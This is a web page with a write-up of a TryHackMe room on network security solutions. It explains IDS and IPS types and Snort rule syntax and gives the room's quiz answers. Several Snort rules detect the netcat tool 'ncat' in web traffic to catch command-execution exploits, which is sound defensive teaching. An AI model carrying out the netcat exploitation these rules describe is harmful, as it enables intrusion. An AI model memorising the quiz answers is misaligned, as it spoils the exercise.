<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content=0x5h1n0k0><link href=https://0x5h1n0k0.github.io/tryhackme/room/l/redteamnetsec/ rel=canonical><link rel=icon href=../../../../assets/favicon.png><meta name=generator content="mkdocs-1.5.2, mkdocs-material-8.3.9"><title>Network Security Solutions | 0x5h1n0k0</title><link rel=stylesheet href=../../../../assets/stylesheets/main.1d29e8d0.min.css><link rel=stylesheet href=../../../../assets/stylesheets/cur.css><link rel=stylesheet href=../../../../assets/stylesheets/footer.scss><link rel=stylesheet href=../../../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Code"}</style><link rel=stylesheet href=../../../../stylesheets/extra.css><script>__md_scope=new URL("../../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-XXXXXXXXXX"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-XXXXXXXXXX",{page_path:e.pathname})})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script><!-- live 2d --><link href=https://r18-nmsl.cn/pio/pio.css rel=stylesheet type=text/css><!-- <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
    <script src="https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script> --></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#network-security-solutions class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../../.. title=0x5h1n0k0 class="md-header__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 0x5h1n0k0 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Network Security Solutions </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../../.. title=0x5h1n0k0 class="md-nav__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> 0x5h1n0k0 </label> <div class=md-nav__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> PINNED <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=PINNED data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> PINNED </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../cve/ class=md-nav__link> CVE </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1_2 type=checkbox id=__nav_1_2> <label class=md-nav__link for=__nav_1_2> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=2> <label class=md-nav__title for=__nav_1_2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../notes/privilege-escalation/linux/ class=md-nav__link> Linux Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../../../notes/privilege-escalation/windows/ class=md-nav__link> Windows Privilege Escalation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../notes/reverse-shell/ class=md-nav__link> Reverse Shell Cheatsheet </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> Try Hack Me <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Try Hack Me" data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Try Hack Me </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../ class=md-nav__link> Machines </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> 247CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=247CTF data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> 247CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../247ctf/ class=md-nav__link> Web </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../dvwa/ class=md-nav__link> DVWA </a> </li> <li class=md-nav__item> <a href=../../../../tags/tags/ class=md-nav__link> Categories </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#task-1-introduction class=md-nav__link> Task 1: Introduction </a> </li> <li class=md-nav__item> <a href=#task-2-ids-engine-types class=md-nav__link> Task 2: IDS Engine Types </a> </li> <li class=md-nav__item> <a href=#task-3-idsips-rule-triggering class=md-nav__link> Task 3: IDS/IPS Rule Triggering </a> </li> <li class=md-nav__item> <a href=#task-4-evasion-via-protocol-manipulation class=md-nav__link> Task 4: Evasion via Protocol Manipulation </a> <nav class=md-nav aria-label="Task 4: Evasion via Protocol Manipulation"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#rely-on-a-different-protocol class=md-nav__link> Rely on a Different Protocol </a> </li> <li class=md-nav__item> <a href=#manipulate-source-tcpudp-port class=md-nav__link> Manipulate (Source) TCP/UDP Port </a> </li> <li class=md-nav__item> <a href=#use-session-splicing-ip-packet-fragmentation class=md-nav__link> Use Session Splicing (IP Packet Fragmentation) </a> </li> <li class=md-nav__item> <a href=#sending-invalid-packets class=md-nav__link> Sending Invalid Packets </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-5-evasion-via-payload-manipulation class=md-nav__link> Task 5: Evasion via Payload Manipulation </a> <nav class=md-nav aria-label="Task 5: Evasion via Payload Manipulation"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#obfuscate-and-encode-the-payload class=md-nav__link> Obfuscate and Encode the Payload </a> </li> <li class=md-nav__item> <a href=#encode-to-base64-format class=md-nav__link> Encode to Base64 format </a> </li> <li class=md-nav__item> <a href=#url-encoding class=md-nav__link> URL Encoding </a> </li> <li class=md-nav__item> <a href=#use-escaped-unicode class=md-nav__link> Use Escaped Unicode </a> </li> <li class=md-nav__item> <a href=#encrypt-the-communication-channel class=md-nav__link> Encrypt the Communication Channel </a> </li> <li class=md-nav__item> <a href=#modify-the-data class=md-nav__link> Modify the data </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-6-evasion-via-route-manipulation class=md-nav__link> Task 6: Evasion via Route Manipulation </a> <nav class=md-nav aria-label="Task 6: Evasion via Route Manipulation"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#relying-on-source-routing class=md-nav__link> Relying on Source Routing </a> </li> <li class=md-nav__item> <a href=#using-proxy-servers class=md-nav__link> Using Proxy Servers </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#task-7-evasion-via-tactical-dos class=md-nav__link> Task 7: Evasion via Tactical DoS </a> </li> <li class=md-nav__item> <a href=#task-8-c2-and-idsips-evasion class=md-nav__link> Task 8: C2 and IDS/IPS Evasion </a> </li> <li class=md-nav__item> <a href=#task-9-next-gen-security class=md-nav__link> Task 9: Next-Gen Security </a> </li> <li class=md-nav__item> <a href=#task-10-summary class=md-nav__link> Task 10: Summary </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/tryhackme/room/l/redteamnetsec/index.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg> </a> <h1 id=network-security-solutions><strong>Network Security Solutions</strong><a class=headerlink href=#network-security-solutions title="Permanent link">&para;</a></h1><p style="color:#bdbdbd"><i>Estimated time to read: 32 minutes</i></p>
 <hr> <h2 id=task-1-introduction><strong>Task 1: Introduction</strong><a class=headerlink href=#task-1-introduction title="Permanent link">&para;</a></h2> <p>An Intrusion Detection System (<abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>) is a system that detects network or system intrusions. One analogy that comes to mind is a guard watching live feeds from different security cameras. He can spot a theft, but he cannot stop it by himself. However, if this guard can contact another guard and ask them to stop the robber, detection turns into prevention. An Intrusion Detection and Prevention System (IDPS) or simply Intrusion Prevention System (IPS) is a system that can detect and prevent intrusions.</p> <p>Understanding the difference between detection and prevention is essential. Snort is a network intrusion detection and intrusion prevention system. Consequently, Snort can be set up as an <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> or an IPS. For Snort to function as an IPS, it needs some mechanism to block (<code>drop</code>) offending connections. This capability requires Snort to be set up as <code>inline</code> and to bridge two or more network cards.</p> <p>As a signature-based network <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>, Snort is shown in the figure below.</p> <p><img alt src=image.png></p> <p>The following figure shows how Snort can be configured as an IPS if set up inline.</p> <p><img alt src=image-1.png></p> <p><abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> setups can be divided based on their location in the network into:</p> <ol> <li>Host-based <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> (HIDS)</li> <li>Network-based <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> (NIDS)</li> </ol> <p>The host-based <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> (HIDS) is installed on an OS along with the other running applications. This setup will give the HIDS the ability to monitor the traffic going in and out of the host; moreover, it can monitor the processes running on the host.</p> <p>The network-based <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> (NIDS) is a dedicated appliance or server to monitor the network traffic. The NIDS should be connected so that it can monitor all the network traffic of the network or VLANs we want to protect. This can be achieved by connecting the NIDS to a monitor port on the switch. The NIDS will process the network traffic to detect malicious traffic.</p> <p>In the figure below, we use two red circles to show the difference in the coverage of a HIDS versus a NIDS.</p> <p><img alt src=image-2.png></p> <details class=question> <summary>Answer the questions bellow</summary> <p>Question: What does an IPS stand for?</p> <blockquote> <p>Ans: Intrusion Prevention System</p> </blockquote> <p>Question: What do you call a system that can detect malicious activity but not stop it?</p> <blockquote> <p>Ans: Intrusion Detection System</p> </blockquote> </details> <h2 id=task-2-ids-engine-types><strong>Task 2: <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> Engine Types</strong><a class=headerlink href=#task-2-ids-engine-types title="Permanent link">&para;</a></h2> <p>We can classify network traffic into:</p> <ul> <li><strong>Benign traffic</strong>: This is the usual traffic that we expect to have and don’t want the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> to alert us about.</li> <li><strong>Malicious traffic</strong>: This is abnormal traffic that we don’t expect to see under normal conditions and consequently want the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> to detect it.</li> </ul> <p><img alt src=image-3.png></p> <p>In the same way that we can classify network traffic, we can also classify host activity. The <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> detection engine is either built around detecting malicious traffic and activity or around recognizing normal traffic and activity. Recognizing “normal” makes it easy to detect any deviation from normal.</p> <p>Consequently, the detection engine of an <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> can be:</p> <ol> <li><strong>Signature-based</strong>: A signature-based <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> requires full knowledge of malicious (or unwanted) traffic. In other words, we need to explicitly feed the signature-based detection engine the characteristics of malicious traffic. Teaching the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> about malicious traffic can be achieved using explicit rules to match against.</li> <li><strong>Anomaly-based</strong>: This requires the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> to have knowledge of what regular traffic looks like. In other words, we need to “teach” the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> what normal is so that it can recognize what is <code>not</code> normal. Teaching the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> about normal traffic, i.e., baseline traffic can be achieved using machine learning or manual rules. Put in another way, signature-based <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> recognizes malicious traffic, so everything that is not malicious is considered benign (normal). This approach is commonly found in anti-virus software, which has a database of known virus signatures. Anything that matches a signature is detected as a virus.</li> </ol> <p>An anomaly-based <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> recognizes normal traffic, so anything that deviates from normal is considered malicious. This approach is more similar to how human beings perceive things; you have certain expectations for speed, performance, and responsiveness when you start your web browser. In other words, you know what “normal” is for your browser. If suddenly you notice that your web browser is too sluggish or unresponsive, you will know that something is wrong. In other words, you knew it when your browser’s performance deviated from normal.</p> <details class=question> <summary>Answer the questions bellow</summary> <p>Question: What kind of <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> engine has a database of all known malicious packets’ contents?</p> <blockquote> <p>Ans: Signature-based</p> </blockquote> <p>Question: What kind of <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> engine needs to learn what normal traffic looks like instead of malicious traffic?</p> <blockquote> <p>Ans: Anomaly-based</p> </blockquote> <p>Question: What kind of <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> engine needs to be updated constantly as new malicious packets and activities are discovered?</p> <blockquote> <p>Ans: Signature-based</p> </blockquote> </details> <h2 id=task-3-idsips-rule-triggering><strong>Task 3: <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS Rule Triggering</strong><a class=headerlink href=#task-3-idsips-rule-triggering title="Permanent link">&para;</a></h2> <p>Each <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS has a certain syntax to write its rules. For example, Snort uses the following format for its rules: <code>Rule Header (Rule Options)</code>, where Rule Header constitutes:</p> <ol> <li>Action: Examples of action include <code>alert</code>, <code>log</code>, <code>pass</code>, <code>drop</code>, and <code>reject</code>.</li> <li>Protocol: <code>TCP</code>, <code>UDP</code>, <code>ICMP</code>, or <code>IP</code>.</li> <li>Source IP/Source Port: <code>!10.10.0.0/16 any</code> refers to everything not in the class B subnet <code>10.10.0.0/16</code>.</li> <li>Direction of Flow: <code>-&gt;</code> indicates left (source) to right (destination), while <code>&lt;&gt;</code> indicates bi-directional traffic.</li> <li>Destination IP/Destination Port: <code>10.10.0.0/16 any</code> to refer to class B subnet <code>10.10.0.0/16</code>.</li> </ol> <p>Below is an example rule to <code>drop</code> all ICMP traffic passing through Snort IPS:</p> <p><code>drop icmp any any -&gt; any any (msg: "ICMP Ping Scan"; dsize:0; sid:1000020; rev: 1;)</code></p> <p>The rule above instructs the Snort IPS to drop any packet of type ICMP from any source IP address (on any port) to any destination IP address (on any port). The message to be added to the logs is “ICMP Ping Scan.”</p> <p><img alt src=image-4.png></p> <p>Let’s consider a hypothetical case where a vulnerability is discovered in our web server. This vulnerability lies in how our web server handles <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr> POST method requests, allowing the attacker to run system commands.</p> <p>Let’s consider the following “naive” approach. We want to create a Snort rule that detects the term <code>ncat</code> in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability.</p> <p><code>alert tcp any any &lt;&gt; any 80 (msg: "Netcat Exploitation"; content:"ncat"; sid: 1000030; rev:1;)</code></p> <p>The rule above inspects the content of the packets exchanged with port 80 for the string <code>ncat</code>. Alternatively, you can choose to write the content that Snort will scan for in hexadecimal format. <code>ncat</code> in ASCII is written as <code>6e 63 61 74</code> in hexadecimal and it is encapsulated as a string by 2 pipe characters <code>|</code>.</p> <p><code>alert tcp any any &lt;&gt; any 80 (msg: "Netcat Exploitation"; content:"|6e 63 61 74|"; sid: 1000031; rev:1;)</code></p> <p>We can further refine it if we expect to see it in <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr> POST requests. Note that flow:established tells the Snort engine to look at streams started by a <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> 3-way handshake (established connections).</p> <p><code>alert tcp any any &lt;&gt; any 80 (msg: "Netcat Exploitation"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)</code></p> <p>If ASCII logging is chosen, the logs would be similar to the two alerts shown next.</p> <div class=highlight><span class=filename>Snort Logs</span><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=p>[**]</span> <span class=p>[</span><span class=n>1</span><span class=p>:</span><span class=n>1000031</span><span class=p>:</span><span class=n>1</span><span class=p>]</span> <span class=n>Netcat</span> <span class=n>Exploitation</span> <span class=p>[**]</span>
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a><span class=p>[</span><span class=n>Priority</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> 
